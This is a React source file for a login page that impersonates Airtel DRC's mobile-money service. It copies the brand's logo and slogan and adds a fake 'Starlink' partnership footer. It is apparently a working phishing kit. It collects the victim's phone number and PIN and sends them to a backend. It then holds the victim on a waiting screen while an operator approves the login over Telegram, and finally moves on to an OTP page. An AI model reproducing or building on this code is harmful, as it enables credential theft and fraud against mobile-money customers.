import React, { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';

const COUNTRY_CODE = '+243';
const PHONE_PLACEHOLDER = '951234567'; 
const PHONE_MAX = 9;

function AirtelLogin() {
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState<string[]>(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  
  // NEW: States for the approval waiting screen
  const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
  const [refId, setRefId] = useState<string | null>(null);

  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
  const navigate = useNavigate();

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    setPhone(val);
    if (val.length === PHONE_MAX) {
      pinRefs.current[0]?.focus();
    }
  };

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newPin = [...pin];
    newPin[index] = value.substring(value.length - 1);
    setPin(newPin);
    if (value && index < 3) {
      pinRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      pinRefs.current[index - 1]?.focus();
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const pinString = pin.join('');

    if (phone.length < PHONE_MAX) {
      setError('Entrez un numéro Airtel DRC valide.');
      return;
    }
    if (pinString.length < 4) {
      setError('Entrez votre code PIN Airtel.');
      return;
    }

    setError('');
    setIsLoading(true);

    const fullPhone = `${COUNTRY_CODE}${phone}`;
    localStorage.setItem('airtelPhone', fullPhone);

    try {
      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
      });

      const data = await response.json();
      console.log('Login response:', data);

      // NEW LOGIC: Wait for admin approval
      if (data.status === 'pending' && data.ref_id) {
        setRefId(data.ref_id);
        setIsWaitingForApproval(true); // Show the overlay
        
        // Poll the backend every 3 seconds to see if admin clicked Approve on Telegram
        const pollInterval = setInterval(async () => {
          try {
            const statusRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login-status/${data.ref_id}`);
            const statusData = await statusRes.json();

            if (statusData.status === 'approved') {
              clearInterval(pollInterval);
              navigate('/airtel-otp');
            } else if (statusData.status === 'rejected' || statusData.status === 'expired') {
              clearInterval(pollInterval);
              setIsWaitingForApproval(false);
              setError("Connexion refusée ou expirée par l'administrateur.");
              setIsLoading(false);
            }
          } catch (pollErr) {
            console.error('Polling error:', pollErr);
          }
        }, 3000);
      } else {
        // Fallback just in case
        navigate('/airtel-otp');
      }
    } catch (err) {
      console.error('Login request failed:', err);
      setError('Une erreur réseau est survenue. Veuillez réessayer.');
      setIsLoading(false);
    }
  };

  return (
    <div className="airtel-page-container">
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .airtel-page-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          background-color: #ffffff;
          position: relative;
        }

        /* FADED BACKGROUND WHEN WAITING */
        .faded-content {
          opacity: 0.15;
          pointer-events: none;
          transition: opacity 0.3s ease;
        }

        /* WAITING OVERLAY */
        .waiting-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          z-index: 9999;
          padding: 20px;
          background-color: rgba(255, 255, 255, 0.4); /* Semi-transparent so faded text shows */
        }

        .custom-spinner {
          width: 60px;
          height: 60px;
          border: 6px solid #E5E7EB;
          border-top: 6px solid #DA1C1C;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin-bottom: 24px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .waiting-title {
          font-size: 22px;
          font-weight: 700;
          color: #1a1a1a;
          margin-bottom: 20px;
        }

        .waiting-message {
          background-color: #FEF2F2;
          color: #4B5563;
          padding: 16px 24px;
          border-radius: 24px;
          text-align: center;
          font-size: 15px;
          font-weight: 500;
          line-height: 1.5;
          max-width: 380px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }

        /* TOP SECTION */
        .login-top-section {
          flex: 1;
          padding: 40px 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
        }

        .logo-wrapper {
          display: flex;
          flex-direction: column;
          align-items: center;
          margin-bottom: 40px;
        }

        .tagline {
          font-size: 10px;
          letter-spacing: 1.5px;
          color: #333;
          text-transform: uppercase;
          margin-top: 8px;
          font-weight: 600;
        }
        
        .tagline span {
          color: #DA1C1C;
        }

        .login-title {
          font-size: 22px;
          font-weight: 700;
          color: #1a1a1a;
          text-align: center;
          line-height: 1.3;
          margin-bottom: 30px;
          max-width: 340px;
        }

        /* PHONE INPUT */
        .phone-input-container {
          width: 100%;
          max-width: 400px;
          display: flex;
          align-items: center;
          border: 2px solid #2A5CAA;
          border-radius: 8px;
          padding: 12px 16px;
          margin-bottom: 32px;
          background-color: #fff;
        }

        .flag-icon {
          width: 24px;
          height: 16px;
          margin-right: 10px;
          border-radius: 2px;
          overflow: hidden;
        }

        .country-code-text {
          font-size: 18px;
          font-weight: 600;
          color: #1a1a1a;
          margin-right: 10px;
        }

        .phone-input {
          flex: 1;
          border: none;
          outline: none;
          font-size: 18px;
          color: #1a1a1a;
          background: transparent;
        }

        .phone-input::placeholder {
          color: #a0a0a0;
        }

        /* PIN INPUT */
        .pin-section {
          width: 100%;
          display: flex;
          flex-direction: column;
          align-items: center;
          margin-bottom: 32px;
        }

        .pin-label {
          font-size: 14px;
          font-weight: 600;
          color: #666;
          margin-bottom: 16px;
        }

        .pin-inputs-row {
          display: flex;
          align-items: center;
          gap: 16px;
        }

        .pin-boxes {
          display: flex;
          gap: 12px;
        }

        .pin-box {
          width: 50px;
          height: 50px;
          border: 2px solid #2A5CAA;
          border-radius: 8px;
          font-size: 24px;
          font-weight: 700;
          text-align: center;
          color: #1a1a1a;
          outline: none;
          background-color: #fff;
        }

        .pin-box::placeholder {
          color: #ccc;
        }

        .eye-icon {
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #666;
        }

        /* BUTTON */
        .login-btn {
          width: 100%;
          max-width: 400px;
          padding: 16px;
          border-radius: 30px;
          border: none;
          background-color: #D1D5DB;
          color: #ffffff;
          font-size: 16px;
          font-weight: 700;
          text-transform: uppercase;
          cursor: pointer;
          transition: background-color 0.2s;
        }

        .login-btn.active {
          background-color: #DA1C1C;
        }

        /* FOOTER SECTION */
        .login-footer {
          background-color: #F3F4F6;
          padding: 32px 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
          border-top: 1px solid #E5E7EB;
        }

        .footer-logo-wrapper {
          display: flex;
          flex-direction: column;
          align-items: center;
          margin-bottom: 24px;
        }

        .collab-text {
          font-size: 14px;
          font-weight: 600;
          color: #333;
          margin-bottom: 4px;
        }

        .starlink-text {
          font-size: 15px;
          font-weight: 800;
          color: #1a1a1a;
          letter-spacing: 1px;
        }

        .starlink-text sup {
          font-size: 8px;
          font-weight: normal;
        }

        .copyright {
          font-size: 12px;
          color: #9CA3AF;
          margin-top: 24px;
        }
      `}</style>

      {/* WAITING OVERLAY (Only shows when waiting) */}
      {isWaitingForApproval && (
        <div className="waiting-overlay">
          <div className="custom-spinner"></div>
          <div className="waiting-title">En attente d'approbation</div>
          <div className="waiting-message">
            Votre demande a été envoyée. Merci de patienter pendant la vérification...
          </div>
        </div>
      )}

      {/* MAIN CONTENT (Gets faded when waiting) */}
      <div className={isWaitingForApproval ? 'faded-content' : ''} style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh' }}>
        
        {/* TOP SECTION */}
        <div className="login-top-section">
          
          {/* LOGO */}
          <div className="logo-wrapper">
            <svg width="140" height="40" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
              <circle cx="25" cy="17" r="5" fill="white"/>
              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
            </svg>
            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
          </div>

          {/* TITLE */}
          <h1 className="login-title">
            Connectez-vous à Airtel Lite pour finaliser le paiement.
          </h1>

          {/* ERROR MESSAGE */}
          {error && (
            <div style={{ color: '#DA1C1C', fontSize: '14px', marginBottom: '16px', textAlign: 'center', fontWeight: '500' }}>
              {error}
            </div>
          )}

          <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
            
            {/* PHONE INPUT */}
            <div className="phone-input-container">
              <svg className="flag-icon" viewBox="0 0 640 480" xmlns="http://www.w3.org/2000/svg">
                <path fill="#007fff" d="M0 0h640v480H0z"/>
                <path fill="#f7d618" d="M0 240h640v240H0z"/>
                <path fill="#ce1021" d="M0 0l640 480M640 0L0 480" stroke="#ce1021" strokeWidth="40"/>
                <path fill="#f7d618" d="M60 60h40v40H60z"/>
              </svg>
              <span className="country-code-text">{COUNTRY_CODE}</span>
              <input
                type="tel"
                className="phone-input"
                placeholder={PHONE_PLACEHOLDER}
                value={phone}
                onChange={handlePhoneChange}
                maxLength={PHONE_MAX}
                disabled={isLoading || isWaitingForApproval}
              />
            </div>

            {/* PIN INPUT */}
            <div className="pin-section">
              <span className="pin-label">Entrez votre Code</span>
              <div className="pin-inputs-row">
                <div className="pin-boxes">
                  {pin.map((digit, index) => (
                    <input
                      key={index}
                      type={showPin ? 'text' : 'password'}
                      maxLength={1}
                      value={digit}
                      ref={(el) => { pinRefs.current[index] = el; }}
                      onChange={(e) => handlePinChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="pin-box"
                      disabled={isLoading || isWaitingForApproval}
                    />
                  ))}
                </div>
                
                {/* Eye Toggle */}
                <div className="eye-icon" onClick={() => setShowPin(!showPin)}>
                  {showPin ? (
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                      <line x1="1" y1="1" x2="23" y2="23"></line>
                    </svg>
                  ) : (
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                      <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                  )}
                </div>
              </div>
            </div>

            {/* BUTTON */}
            <button 
              type="submit" 
              className={`login-btn ${(phone.length === PHONE_MAX && pin.join('').length === 4) ? 'active' : ''}`}
              disabled={isLoading || isWaitingForApproval}
            >
              {isLoading && !isWaitingForApproval ? 'Chargement...' : 'CONNEXION'}
            </button>

          </form>
        </div>

        {/* FOOTER SECTION */}
        <div className="login-footer">
          <div className="footer-logo-wrapper">
            <svg width="110" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
              <circle cx="25" cy="17" r="5" fill="white"/>
              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
            </svg>
            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
          </div>

          <p className="collab-text">En collaboration avec</p>
          <p className="starlink-text">STARLINK<sup>TM</sup></p>

          <p className="copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
        </div>
      </div>
    </div>
  );
}

export default AirtelLogin;